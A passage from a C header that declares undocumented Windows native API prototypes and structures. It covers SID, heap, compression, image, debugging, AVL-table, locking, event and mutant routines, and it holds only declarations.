    _In_ PACCESS_MASK AccessMask,
    _In_ PGENERIC_MAPPING GenericMapping);

NTSYSAPI
BOOLEAN
NTAPI
RtlValidSid(
    _In_ PSID Sid);

NTSYSAPI
BOOLEAN
NTAPI
RtlEqualSid(
    _In_ PSID Sid1,
    _In_ PSID Sid2);

NTSYSAPI
BOOLEAN
NTAPI
RtlEqualPrefixSid(
    _In_ PSID Sid1,
    _In_ PSID Sid2);

NTSYSAPI
ULONG
NTAPI
RtlLengthRequiredSid(
    _In_ ULONG SubAuthorityCount);

NTSYSAPI
PVOID
NTAPI
RtlFreeSid(
    _In_ PSID Sid);

NTSYSAPI
NTSTATUS
NTAPI
RtlAllocateAndInitializeSid(
    _In_ PSID_IDENTIFIER_AUTHORITY IdentifierAuthority,
    _In_ UCHAR SubAuthorityCount,
    _In_ ULONG SubAuthority0,
    _In_ ULONG SubAuthority1,
    _In_ ULONG SubAuthority2,
    _In_ ULONG SubAuthority3,
    _In_ ULONG SubAuthority4,
    _In_ ULONG SubAuthority5,
    _In_ ULONG SubAuthority6,
    _In_ ULONG SubAuthority7,
    _Out_ PSID *Sid);

NTSYSAPI
NTSTATUS
NTAPI
RtlInitializeSid(
    _Out_ PSID Sid,
    _In_ PSID_IDENTIFIER_AUTHORITY IdentifierAuthority,
    _In_ UCHAR SubAuthorityCount);

NTSYSAPI
PSID_IDENTIFIER_AUTHORITY
NTAPI
RtlIdentifierAuthoritySid(
    _In_ PSID Sid);

NTSYSAPI
PULONG
NTAPI
RtlSubAuthoritySid(
    _In_ PSID Sid,
    _In_ ULONG SubAuthority);

NTSYSAPI
PUCHAR
NTAPI
RtlSubAuthorityCountSid(
    _In_ PSID Sid);

NTSYSAPI
ULONG
NTAPI
RtlLengthSid(
    _In_ PSID Sid);

NTSYSAPI
NTSTATUS
NTAPI
RtlCopySid(
    _In_ ULONG DestinationSidLength,
    _In_ PSID DestinationSid,
    _In_ PSID SourceSid);

NTSYSAPI
NTSTATUS
NTAPI
RtlCopySidAndAttributesArray(
    _In_ ULONG ArrayLength,
    _In_ PSID_AND_ATTRIBUTES Source,
    _In_ ULONG TargetSidBufferSize,
    _Out_ PSID_AND_ATTRIBUTES TargetArrayElement,
    _Out_ PSID TargetSid,
    _Out_ PSID *NextTargetSid,
    _Out_ PULONG RemainingTargetSidBufferSize);

NTSYSAPI
NTSTATUS
NTAPI
RtlLengthSidAsUnicodeString(
    _In_ PSID Sid,
    _Out_ PULONG StringLength);

NTSYSAPI
NTSTATUS
NTAPI
RtlConvertSidToUnicodeString(
    _In_ PUNICODE_STRING UnicodeString,
    _In_ PSID Sid,
    _In_ BOOLEAN AllocateDestinationString);

NTSYSAPI
NTSTATUS
NTAPI
RtlCreateServiceSid(
    _In_ PUNICODE_STRING ServiceName,
    _Out_writes_bytes_opt_(*ServiceSidLength) PSID ServiceSid,
    _Inout_ PULONG ServiceSidLength);

NTSYSAPI
NTSTATUS
NTAPI
RtlCreateSecurityDescriptor(
    _In_ PSECURITY_DESCRIPTOR SecurityDescriptor,
    _In_ ULONG Revision);

NTSYSAPI
NTSTATUS
NTAPI
RtlSetOwnerSecurityDescriptor(
    _In_ PSECURITY_DESCRIPTOR SecurityDescriptor,
    _In_ PSID Owner,
    _In_ BOOLEAN OwnerDefaulted);

NTSYSAPI
NTSTATUS
NTAPI
RtlCopySecurityDescriptor(
    _In_ PSECURITY_DESCRIPTOR InputSecurityDescriptor,
    _Out_ PSECURITY_DESCRIPTOR *OutputSecurityDescriptor);

FORCEINLINE LUID NTAPI RtlConvertLongToLuid(
    _In_ LONG Long
)
{
    LUID TempLuid;
    LARGE_INTEGER TempLi;

    TempLi.QuadPart = Long;
    TempLuid.LowPart = TempLi.LowPart;
    TempLuid.HighPart = TempLi.HighPart;
    return(TempLuid);
}

NTSYSAPI
ULONG
NTAPI
RtlUniform(
    _Inout_ PULONG Seed);

NTSYSAPI
ULONG
NTAPI
RtlRandomEx(
    _Inout_ PULONG Seed);

NTSYSAPI
ULONG32
NTAPI
RtlComputeCrc32(
    _In_ ULONG32 PartialCrc,
    _In_ PVOID Buffer,
    _In_ ULONG Length);

NTSYSAPI
NTSTATUS
NTAPI
RtlAdjustPrivilege(
    _In_ ULONG Privilege,
    _In_ BOOLEAN Enable,
    _In_ BOOLEAN Client,
    _Out_ PBOOLEAN WasEnabled);

/************************************************************************************
*
* RTL Version API.
*
************************************************************************************/

NTSYSAPI
NTSTATUS
NTAPI
RtlGetVersion(
    _Inout_	PRTL_OSVERSIONINFOW lpVersionInformation);

NTSYSAPI
VOID
NTAPI
RtlGetNtVersionNumbers(
    _Out_opt_ PULONG MajorVersion,
    _Out_opt_ PULONG MinorVersion,
    _Out_opt_ PULONG BuildNumber);

/************************************************************************************
*
* RTL Error Status API.
*
************************************************************************************/

NTSYSAPI
ULONG
NTAPI
RtlNtStatusToDosError(
    _In_ NTSTATUS Status);

NTSYSAPI
VOID
NTAPI
RtlSetLastWin32Error(
    _In_ LONG Win32Error);

NTSYSAPI
NTSTATUS
NTAPI
RtlGetLastNtStatus(
    VOID);

NTSYSAPI
LONG
NTAPI
RtlGetLastWin32Error(
    VOID);

NTSYSAPI
ULONG
NTAPI
RtlNtStatusToDosErrorNoTeb(
    _In_ NTSTATUS Status);

NTSYSAPI
VOID
NTAPI
RtlSetLastWin32ErrorAndNtStatusFromNtStatus(
    _In_ NTSTATUS Status);

/************************************************************************************
*
* RTL WOW64 Support API.
*
************************************************************************************/

NTSYSAPI
NTSTATUS
NTAPI
RtlWow64EnableFsRedirection(
    _In_ BOOLEAN Wow64FsEnableRedirection);

NTSYSAPI
NTSTATUS
NTAPI
RtlWow64EnableFsRedirectionEx(
    _In_ PVOID DisableFsRedirection,
    _Out_ PVOID *OldFsRedirectionLevel);

NTSYSAPI
NTSTATUS
NTAPI
RtlWow64GetThreadContext(
    _In_ HANDLE ThreadHandle,
    _Inout_ PWOW64_CONTEXT ThreadContext);

NTSYSAPI
NTSTATUS
NTAPI
RtlWow64SetThreadContext(
    _In_ HANDLE ThreadHandle,
    _In_ PWOW64_CONTEXT ThreadContext);

/************************************************************************************
*
* RTL Heap Management API.
*
************************************************************************************/

typedef NTSTATUS(NTAPI * PRTL_HEAP_COMMIT_ROUTINE)(
    _In_  PVOID Base,
    _Inout_ PVOID *CommitAddress,
    _Inout_ PSIZE_T CommitSize
    );

typedef struct _RTL_HEAP_PARAMETERS {
    ULONG Length;
    SIZE_T SegmentReserve;
    SIZE_T SegmentCommit;
    SIZE_T DeCommitFreeBlockThreshold;
    SIZE_T DeCommitTotalFreeThreshold;
    SIZE_T MaximumAllocationSize;
    SIZE_T VirtualMemoryThreshold;
    SIZE_T InitialCommit;
    SIZE_T InitialReserve;
    PRTL_HEAP_COMMIT_ROUTINE CommitRoutine;
    SIZE_T Reserved[2];
} RTL_HEAP_PARAMETERS, *PRTL_HEAP_PARAMETERS;

NTSYSAPI
PVOID
NTAPI
RtlCreateHeap(
    _In_ ULONG Flags,
    _In_opt_ PVOID HeapBase,
    _In_opt_ SIZE_T ReserveSize,
    _In_opt_ SIZE_T CommitSize,
    _In_opt_ PVOID Lock,
    _In_opt_ PRTL_HEAP_PARAMETERS Parameters);

NTSYSAPI
PVOID
NTAPI
RtlDestroyHeap(
    _In_ PVOID HeapHandle);

NTSYSAPI
NTSTATUS
NTAPI
RtlSetHeapInformation(
    _In_ PVOID HeapHandle,
    _In_ HEAP_INFORMATION_CLASS HeapInformationClass,
    _In_opt_ PVOID HeapInformation,
    _In_opt_ SIZE_T HeapInformationLength);

NTSYSAPI
NTSTATUS
NTAPI
RtlQueryHeapInformation(
    _In_ PVOID HeapHandle,
    _In_ HEAP_INFORMATION_CLASS HeapInformationClass,
    _Out_opt_ PVOID HeapInformation,
    _In_opt_ SIZE_T HeapInformationLength,
    _Out_opt_ PSIZE_T ReturnLength);

NTSYSAPI
PVOID
NTAPI
RtlAllocateHeap(
    _In_ PVOID HeapHandle,
    _In_ ULONG Flags,
    _In_ SIZE_T Size);

NTSYSAPI
BOOLEAN
NTAPI
RtlFreeHeap(
    _In_ PVOID HeapHandle,
    _In_ ULONG Flags,
    _In_ PVOID BaseAddress);

NTSYSAPI
NTSTATUS
NTAPI
RtlZeroHeap(
    _In_ PVOID HeapHandle,
    _In_ ULONG Flags);

NTSYSAPI
SIZE_T
NTAPI
RtlSizeHeap(
    _In_ PVOID HeapHandle,
    _In_ ULONG Flags,
    _In_ PVOID BaseAddress);

NTSYSAPI
VOID
NTAPI
RtlProtectHeap(
    _In_ PVOID HeapHandle,
    _In_ BOOLEAN MakeReadOnly);

NTSYSAPI
PVOID
NTAPI
RtlReAllocateHeap(
    _In_ PVOID HeapHandle,
    _In_ ULONG Flags,
    _Frees_ptr_opt_ PVOID BaseAddress,
    _In_ SIZE_T Size);

NTSYSAPI
ULONG
NTAPI
RtlGetProcessHeaps(
    _In_ ULONG NumberOfHeaps,
    _Out_ PVOID *ProcessHeaps);

typedef NTSTATUS(NTAPI *PRTL_ENUM_HEAPS_ROUTINE)(
    _In_ PVOID HeapHandle,
    _In_ PVOID Parameter
    );

NTSYSAPI
NTSTATUS
NTAPI
RtlEnumProcessHeaps(
    _In_ PRTL_ENUM_HEAPS_ROUTINE EnumRoutine,
    _In_ PVOID Parameter);

/************************************************************************************
*
* RTL Compression API.
*
************************************************************************************/

NTSYSAPI
NTSTATUS
NTAPI
RtlGetCompressionWorkSpaceSize(
    _In_ USHORT CompressionFormatAndEngine,
    _Out_ PULONG CompressBufferWorkSpaceSize,
    _Out_ PULONG CompressFragmentWorkSpaceSize);

NTSYSAPI
NTSTATUS
NTAPI
RtlCompressBuffer(
    _In_ USHORT CompressionFormatAndEngine,
    _In_reads_bytes_(UncompressedBufferSize) PUCHAR UncompressedBuffer,
    _In_ ULONG UncompressedBufferSize,
    _Out_writes_bytes_to_(CompressedBufferSize, *FinalCompressedSize) PUCHAR CompressedBuffer,
    _In_ ULONG CompressedBufferSize,
    _In_ ULONG UncompressedChunkSize,
    _Out_ PULONG FinalCompressedSize,
    _In_ PVOID WorkSpace);

NTSYSAPI
NTSTATUS
NTAPI
RtlDecompressBuffer(
    _In_ USHORT CompressionFormat,
    _Out_writes_bytes_to_(UncompressedBufferSize, *FinalUncompressedSize) PUCHAR UncompressedBuffer,
    _In_ ULONG UncompressedBufferSize,
    _In_reads_bytes_(CompressedBufferSize) PUCHAR CompressedBuffer,
    _In_ ULONG CompressedBufferSize,
    _Out_ PULONG FinalUncompressedSize);

NTSYSAPI
NTSTATUS
NTAPI
RtlDecompressBufferEx(
    _In_ USHORT CompressionFormat,
    _Out_writes_bytes_to_(UncompressedBufferSize, *FinalUncompressedSize) PUCHAR UncompressedBuffer,
    _In_ ULONG UncompressedBufferSize,
    _In_reads_bytes_(CompressedBufferSize) PUCHAR CompressedBuffer,
    _In_ ULONG CompressedBufferSize,
    _Out_ PULONG FinalUncompressedSize,
    _In_ PVOID WorkSpace);

/************************************************************************************
*
* RTL Image API.
*
************************************************************************************/

#define RTL_IMAGE_NT_HEADER_EX_FLAG_NO_RANGE_CHECK (0x00000001)

NTSYSAPI
PIMAGE_NT_HEADERS
NTAPI
RtlImageNtHeader(
    _In_ PVOID Base);

NTSYSAPI
NTSTATUS
NTAPI
RtlImageNtHeaderEx(
    _In_ ULONG Flags,
    _In_ PVOID Base,
    _In_ ULONG64 Size,
    _Out_ PIMAGE_NT_HEADERS * OutHeaders);

NTSYSAPI
PVOID
NTAPI
RtlAddressInSectionTable(
    _In_ PIMAGE_NT_HEADERS NtHeaders,
    _In_ PVOID BaseOfImage,
    _In_ ULONG VirtualAddress);

NTSYSAPI
PIMAGE_SECTION_HEADER
NTAPI
RtlSectionTableFromVirtualAddress(
    _In_ PIMAGE_NT_HEADERS NtHeaders,
    _In_ PVOID BaseOfImage,
    _In_ ULONG VirtualAddress);

NTSYSAPI
PVOID
NTAPI
RtlImageDirectoryEntryToData(
    _In_ PVOID BaseOfImage,
    _In_ BOOLEAN MappedAsImage,
    _In_ USHORT DirectoryEntry,
    _Out_ PULONG Size);

NTSYSAPI
PIMAGE_SECTION_HEADER
NTAPI
RtlImageRvaToSection(
    _In_ PIMAGE_NT_HEADERS NtHeaders,
    _In_ PVOID Base,
    _In_ ULONG Rva);

NTSYSAPI
PVOID
NTAPI
RtlImageRvaToVa(
    _In_ PIMAGE_NT_HEADERS NtHeaders,
    _In_ PVOID Base,
    _In_ ULONG Rva,
    _Inout_opt_ PIMAGE_SECTION_HEADER *LastRvaSection);

/************************************************************************************
*
* RTL Time API.
*
************************************************************************************/

NTSYSAPI
VOID
NTAPI
RtlSecondsSince1970ToTime(
    _In_ ULONG ElapsedSeconds,
    _Out_ PLARGE_INTEGER Time);

NTSYSAPI
VOID
NTAPI
RtlSecondsSince1980ToTime(
    _In_ ULONG ElapsedSeconds,
    _Out_ PLARGE_INTEGER Time);

NTSYSAPI
BOOLEAN
NTAPI
RtlTimeToSecondsSince1980(
    _In_ PLARGE_INTEGER Time,
    _Out_ PULONG ElapsedSeconds);

NTSYSAPI
VOID
NTAPI
RtlTimeToTimeFields(
    _In_ PLARGE_INTEGER Time,
    _Out_ PTIME_FIELDS TimeFields);

NTSYSAPI
BOOLEAN
NTAPI
RtlTimeFieldsToTime(
    _In_ PTIME_FIELDS TimeFields,
    _Out_ PLARGE_INTEGER Time);

/************************************************************************************
*
* RTL Debug Support API.
*
************************************************************************************/

NTSYSAPI
ULONG
STDAPIVCALLTYPE
DbgPrint(
    _In_z_ _Printf_format_string_ PCH Format,
    ...);

NTSYSAPI
NTSTATUS
NTAPI
DbgQueryDebugFilterState(
    _In_ ULONG ComponentId,
    _In_ ULONG Level);

NTSYSAPI
NTSTATUS
NTAPI
DbgSetDebugFilterState(
    _In_ ULONG ComponentId,
    _In_ ULONG Level,
    _In_ BOOLEAN State);

NTSYSAPI
VOID
NTAPI
DbgUserBreakPoint(
    VOID);

NTSYSAPI
VOID
NTAPI
DbgBreakPoint(
    VOID);

NTSYSAPI
NTSTATUS
NTAPI
DbgUiConnectToDbg(
    VOID);

NTSYSAPI
VOID
NTAPI
DbgUiSetThreadDebugObject(
    _In_ HANDLE DebugObject);

NTSYSAPI
NTSTATUS
NTAPI
DbgUiContinue(
    _In_ PCLIENT_ID AppClientId,
    _In_ NTSTATUS ContinueStatus);

NTSYSAPI
NTSTATUS
NTAPI
DbgUiStopDebugging(
    _In_ HANDLE Process);

NTSYSAPI
NTSTATUS
NTAPI
DbgUiDebugActiveProcess(
    _In_ HANDLE Process);

/************************************************************************************
*
* RTL AVL Tree API.
*
************************************************************************************/

typedef enum _TABLE_SEARCH_RESULT {
    TableEmptyTree,
    TableFoundNode,
    TableInsertAsLeft,
    TableInsertAsRight
} TABLE_SEARCH_RESULT;

typedef enum _RTL_GENERIC_COMPARE_RESULTS {
    GenericLessThan,
    GenericGreaterThan,
    GenericEqual
} RTL_GENERIC_COMPARE_RESULTS;

//
// Add an empty typedef so that functions can reference the
// a pointer to the generic table struct before it is declared.
//

#if defined (__cplusplus)
struct _RTL_AVL_TABLE;
#else
typedef struct _RTL_AVL_TABLE RTL_AVL_TABLE;
typedef struct PRTL_AVL_TABLE *_RTL_AVL_TABLE;
#endif

typedef RTL_GENERIC_COMPARE_RESULTS(NTAPI *PRTL_AVL_COMPARE_ROUTINE)(
    _In_  struct _RTL_AVL_TABLE *Table,
    _In_ PVOID FirstStruct,
    _In_ PVOID SecondStruct
    );

typedef PVOID(NTAPI *PRTL_AVL_ALLOCATE_ROUTINE)(
    _In_ struct _RTL_AVL_TABLE *Table,
    _In_ ULONG ByteSize
    );

typedef VOID(NTAPI *PRTL_AVL_FREE_ROUTINE)(
    _In_  struct _RTL_AVL_TABLE *Table,
    _In_ _Post_invalid_ PVOID Buffer
    );

typedef NTSTATUS(NTAPI *PRTL_AVL_MATCH_FUNCTION)(
    _In_ struct _RTL_AVL_TABLE *Table,
    _In_ PVOID UserData,
    _In_ PVOID MatchData
    );

typedef struct _RTL_BALANCED_LINKS {
    struct _RTL_BALANCED_LINKS *Parent;
    struct _RTL_BALANCED_LINKS *LeftChild;
    struct _RTL_BALANCED_LINKS *RightChild;
    CHAR Balance;
    UCHAR Reserved[3];
} RTL_BALANCED_LINKS, *PRTL_BALANCED_LINKS;

typedef struct _RTL_AVL_TABLE {
    RTL_BALANCED_LINKS BalancedRoot;
    PVOID OrderedPointer;
    ULONG WhichOrderedElement;
    ULONG NumberGenericTableElements;
    ULONG DepthOfTree;
    PRTL_BALANCED_LINKS RestartKey;
    ULONG DeleteCount;
    PRTL_AVL_COMPARE_ROUTINE CompareRoutine;
    PRTL_AVL_ALLOCATE_ROUTINE AllocateRoutine;
    PRTL_AVL_FREE_ROUTINE FreeRoutine;
    PVOID TableContext;
} RTL_AVL_TABLE, *PRTL_AVL_TABLE;

NTSYSAPI
VOID
NTAPI
RtlInitializeGenericTableAvl(
    _Out_ PRTL_AVL_TABLE Table,
    _In_ PRTL_AVL_COMPARE_ROUTINE CompareRoutine,
    _In_ PRTL_AVL_ALLOCATE_ROUTINE AllocateRoutine,
    _In_ PRTL_AVL_FREE_ROUTINE FreeRoutine,
    _In_opt_ PVOID TableContext);

NTSYSAPI
PVOID
NTAPI
RtlInsertElementGenericTableAvl(
    _In_ PRTL_AVL_TABLE Table,
    _In_reads_bytes_(BufferSize) PVOID Buffer,
    _In_ CLONG BufferSize,
    _Out_opt_ PBOOLEAN NewElement);

NTSYSAPI
PVOID
NTAPI
RtlInsertElementGenericTableFullAvl(
    _In_ PRTL_AVL_TABLE Table,
    _In_reads_bytes_(BufferSize) PVOID Buffer,
    _In_ CLONG BufferSize,
    _Out_opt_ PBOOLEAN NewElement,
    _In_ PVOID NodeOrParent,
    _In_ TABLE_SEARCH_RESULT SearchResult);

NTSYSAPI
BOOLEAN
NTAPI
RtlDeleteElementGenericTableAvl(
    _In_ PRTL_AVL_TABLE Table,
    _In_ PVOID Buffer);

NTSYSAPI
PVOID
NTAPI
RtlLookupElementGenericTableAvl(
    _In_ PRTL_AVL_TABLE Table,
    _In_ PVOID Buffer);

NTSYSAPI
PVOID
NTAPI
RtlLookupElementGenericTableFullAvl(
    _In_ PRTL_AVL_TABLE Table,
    _In_ PVOID Buffer,
    _Out_ PVOID *NodeOrParent,
    _Out_ TABLE_SEARCH_RESULT *SearchResult);

NTSYSAPI
PVOID
NTAPI
RtlEnumerateGenericTableAvl(
    _In_ PRTL_AVL_TABLE Table,
    _In_ BOOLEAN Restart);

NTSYSAPI
PVOID
NTAPI
RtlEnumerateGenericTableWithoutSplayingAvl(
    _In_ PRTL_AVL_TABLE Table,
    _Inout_ PVOID *RestartKey);

NTSYSAPI
PVOID
NTAPI
RtlLookupFirstMatchingElementGenericTableAvl(
    _In_ PRTL_AVL_TABLE Table,
    _In_ PVOID Buffer,
    _Out_ PVOID *RestartKey);

NTSYSAPI
PVOID
NTAPI
RtlEnumerateGenericTableLikeADirectory(
    _In_ PRTL_AVL_TABLE Table,
    _In_opt_ PRTL_AVL_MATCH_FUNCTION MatchFunction,
    _In_opt_ PVOID MatchData,
    _In_ ULONG NextFlag,
    _Inout_ PVOID *RestartKey,
    _Inout_ PULONG DeleteCount,
    _In_ PVOID Buffer);

NTSYSAPI
PVOID
NTAPI
RtlGetElementGenericTableAvl(
    _In_ PRTL_AVL_TABLE Table,
    _In_ ULONG I);

NTSYSAPI
ULONG
NTAPI
RtlNumberGenericTableElementsAvl(
    _In_ PRTL_AVL_TABLE Table);

NTSYSAPI
BOOLEAN
NTAPI
RtlIsGenericTableEmptyAvl(
    _In_ PRTL_AVL_TABLE Table);

/************************************************************************************
*
* RTL Critical Section Support API.
*
************************************************************************************/

NTSYSAPI
NTSTATUS
NTAPI
RtlEnterCriticalSection(
    _In_ PRTL_CRITICAL_SECTION CriticalSection);

NTSYSAPI
NTSTATUS
NTAPI
RtlLeaveCriticalSection(
    _In_ PRTL_CRITICAL_SECTION CriticalSection);

NTSYSAPI
LOGICAL
NTAPI
RtlIsCriticalSectionLocked(
    _In_ PRTL_CRITICAL_SECTION CriticalSection);

NTSYSAPI
LOGICAL
NTAPI
RtlIsCriticalSectionLockedByThread(
    _In_ PRTL_CRITICAL_SECTION CriticalSection);

NTSYSAPI
ULONG
NTAPI
RtlGetCriticalSectionRecursionCount(
    _In_ PRTL_CRITICAL_SECTION CriticalSection);

NTSYSAPI
LOGICAL
NTAPI
RtlTryEnterCriticalSection(
    _In_ PRTL_CRITICAL_SECTION CriticalSection);

NTSYSAPI
NTSTATUS
NTAPI
RtlInitializeCriticalSection(
    _In_ PRTL_CRITICAL_SECTION CriticalSection);

NTSYSAPI
VOID
NTAPI
RtlEnableEarlyCriticalSectionEventCreation(
    VOID);

NTSYSAPI
NTSTATUS
NTAPI
RtlInitializeCriticalSectionAndSpinCount(
    _In_ PRTL_CRITICAL_SECTION CriticalSection,
    _In_ ULONG SpinCount);

NTSYSAPI
ULONG
NTAPI
RtlSetCriticalSectionSpinCount(
    _In_ PRTL_CRITICAL_SECTION CriticalSection,
    _In_ ULONG SpinCount);

NTSYSAPI
NTSTATUS
NTAPI
RtlDeleteCriticalSection(
    _In_ PRTL_CRITICAL_SECTION CriticalSection);

/************************************************************************************
*
* RTL SRW Lock Support API.
*
************************************************************************************/

NTSYSAPI
VOID
NTAPI
RtlInitializeSRWLock(
    _Out_ PRTL_SRWLOCK SRWLock);

NTSYSAPI
VOID
NTAPI
RtlAcquireSRWLockExclusive(
    _Inout_ PRTL_SRWLOCK SRWLock);

NTSYSAPI
VOID
NTAPI
RtlAcquireSRWLockShared(
    _Inout_ PRTL_SRWLOCK SRWLock);

NTSYSAPI
VOID
NTAPI
RtlReleaseSRWLockExclusive(
    _Inout_ PRTL_SRWLOCK SRWLock);

NTSYSAPI
VOID
NTAPI
RtlReleaseSRWLockShared(
    _Inout_ PRTL_SRWLOCK SRWLock);

NTSYSAPI
BOOLEAN
NTAPI
RtlTryAcquireSRWLockExclusive(
    _Inout_ PRTL_SRWLOCK SRWLock);

NTSYSAPI
BOOLEAN
NTAPI
RtlTryAcquireSRWLockShared(
    _Inout_ PRTL_SRWLOCK SRWLock);

NTSYSAPI
VOID
NTAPI
RtlAcquireReleaseSRWLockExclusive(
    _Inout_ PRTL_SRWLOCK SRWLock);

NTSYSAPI
VOID
NTAPI
RtlUpdateClonedSRWLock(
    _Inout_ PRTL_SRWLOCK SRWLock,
    _In_ LOGICAL Shared);

/************************************************************************************
*
* RTL UAC Support API.
*
************************************************************************************/

#define DBG_FLAG_ELEVATION_ENABLED        1
#define DBG_FLAG_VIRTUALIZATION_ENABLED   2
#define DBG_FLAG_INSTALLER_DETECT_ENABLED 3

NTSYSAPI
NTSTATUS
NTAPI
RtlQueryElevationFlags(
    _Inout_ ULONG *ElevationFlags);

/************************************************************************************
*
* RTL Misc Support API.
*
************************************************************************************/

NTSYSAPI
BOOLEAN
NTAPI
RtlDoesFileExists_U(
    _In_ PCWSTR FileName);

/************************************************************************************
*
* RTL Boundary Descriptor API.
*
************************************************************************************/

NTSYSAPI
PVOID
NTAPI
RtlCreateBoundaryDescriptor(
    _In_ PUNICODE_STRING Name,
    _In_ ULONG Flags);

NTSYSAPI
VOID
NTAPI
RtlDeleteBoundaryDescriptor(
    _In_ PVOID BoundaryDescriptor);

NTSYSAPI
NTSTATUS
NTAPI
RtlAddSIDToBoundaryDescriptor(
    _Inout_ PVOID *BoundaryDescriptor,
    _In_ PSID RequiredSid);

NTSYSAPI
NTSTATUS
NTAPI
RtlAddIntegrityLabelToBoundaryDescriptor(
    _Inout_ PVOID *BoundaryDescriptor,
    _In_ PSID IntegrityLabel);

/************************************************************************************
*
* ETW API.
*
************************************************************************************/

struct _EVENT_FILTER_DESCRIPTOR;

typedef VOID(NTAPI *PENABLECALLBACK)(
    _In_ LPCGUID SourceId,
    _In_ ULONG IsEnabled,
    _In_ UCHAR Level,
    _In_ ULONGLONG MatchAnyKeyword,
    _In_ ULONGLONG MatchAllKeyword,
    _In_opt_ struct _EVENT_FILTER_DESCRIPTOR *FilterData,
    _Inout_opt_ PVOID CallbackContext
    );

NTSYSAPI
NTSTATUS
NTAPI
EtwEventRegister(
    _In_ LPCGUID ProviderId,
    _In_opt_ PENABLECALLBACK EnableCallback,
    _In_opt_ PVOID CallbackContext,
    _Out_ PREGHANDLE RegHandle);

/*
** Runtime Library API END
*/

/*
** Native API START
*/

/************************************************************************************
*
* System Information API.
*
************************************************************************************/

NTSYSAPI
NTSTATUS
WINAPI
NtQuerySystemInformation(
    _In_ SYSTEM_INFORMATION_CLASS SystemInformationClass,
    _Out_writes_bytes_opt_(SystemInformationLength) PVOID SystemInformation,
    _In_ ULONG SystemInformationLength,
    _Out_opt_ PULONG ReturnLength);

NTSYSAPI
NTSTATUS
NTAPI
NtQuerySystemInformationEx(
    _In_ SYSTEM_INFORMATION_CLASS SystemInformationClass,
    _In_reads_bytes_(InputBufferLength) PVOID InputBuffer,
    _In_ ULONG InputBufferLength,
    _Out_writes_bytes_opt_(SystemInformationLength) PVOID SystemInformation,
    _In_ ULONG SystemInformationLength,
    _Out_opt_ PULONG ReturnLength);

NTSYSAPI
NTSTATUS
NTAPI
NtSetSystemInformation(
    _In_ SYSTEM_INFORMATION_CLASS SystemInformationClass,
    _In_reads_bytes_opt_(SystemInformationLength) PVOID SystemInformation,
    _In_ ULONG SystemInformationLength);

/************************************************************************************
*
* Event (EventPair) API.
*
************************************************************************************/

typedef enum _EVENT_INFORMATION_CLASS {
    EventBasicInformation
} EVENT_INFORMATION_CLASS;

typedef enum _EVENT_TYPE {
    NotificationEvent,
    SynchronizationEvent
} EVENT_TYPE;

typedef struct _EVENT_BASIC_INFORMATION {
    EVENT_TYPE EventType;
    LONG EventState;
} EVENT_BASIC_INFORMATION, *PEVENT_BASIC_INFORMATION;

NTSYSAPI
NTSTATUS
NTAPI
NtCreateEvent(
    _Out_ PHANDLE EventHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ EVENT_TYPE EventType,
    _In_ BOOLEAN InitialState);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenEvent(
    _Out_ PHANDLE EventHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI
NTSTATUS
NTAPI
NtSetEvent(
    _In_ HANDLE EventHandle,
    _Out_opt_ PLONG PreviousState);

NTSYSAPI
NTSTATUS
NTAPI
NtClearEvent(
    _In_ HANDLE EventHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtResetEvent(
    _In_ HANDLE EventHandle,
    _Out_opt_ PLONG PreviousState);

NTSYSAPI
NTSTATUS
NTAPI
NtPulseEvent(
    _In_ HANDLE EventHandle,
    _Out_opt_ PLONG PreviousState);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenKeyedEvent(
    _Out_ PHANDLE KeyedEventHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryEvent(
    _In_ HANDLE EventHandle,
    _In_ EVENT_INFORMATION_CLASS EventInformationClass,
    _Out_writes_bytes_(EventInformationLength) PVOID EventInformation,
    _In_ ULONG EventInformationLength,
    _Out_opt_ PULONG ReturnLength);

NTSYSAPI
NTSTATUS
NTAPI
NtCreateEventPair(
    _Out_ PHANDLE EventPairHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenEventPair(
    _Out_ PHANDLE EventPairHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI
NTSTATUS
NTAPI
NtSetLowEventPair(
    _In_ HANDLE EventPairHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtSetHighEventPair(
    _In_ HANDLE EventPairHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtWaitLowEventPair(
    _In_ HANDLE EventPairHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtWaitHighEventPair(
    _In_ HANDLE EventPairHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtSetLowWaitHighEventPair(
    _In_ HANDLE EventPairHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtSetHighWaitLowEventPair(
    _In_ HANDLE EventPairHandle);

/************************************************************************************
*
* Mutant API.
*
************************************************************************************/

typedef enum _MUTANT_INFORMATION_CLASS {
    MutantBasicInformation,
    MutantOwnerInformation
} MUTANT_INFORMATION_CLASS;

typedef struct _MUTANT_BASIC_INFORMATION {
    LONG CurrentCount;
    BOOLEAN OwnedByCaller;
    BOOLEAN AbandonedState;
} MUTANT_BASIC_INFORMATION, *PMUTANT_BASIC_INFORMATION;

typedef struct _MUTANT_OWNER_INFORMATION {
    CLIENT_ID ClientId;
} MUTANT_OWNER_INFORMATION, *PMUTANT_OWNER_INFORMATION;

NTSYSAPI
NTSTATUS
NTAPI
NtCreateMutant(
    _Out_ PHANDLE MutantHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ BOOLEAN InitialOwner);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenMutant(
    _Out_ PHANDLE MutantHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryMutant(
    _In_ HANDLE MutantHandle,
    _In_ MUTANT_INFORMATION_CLASS MutantInformationClass,
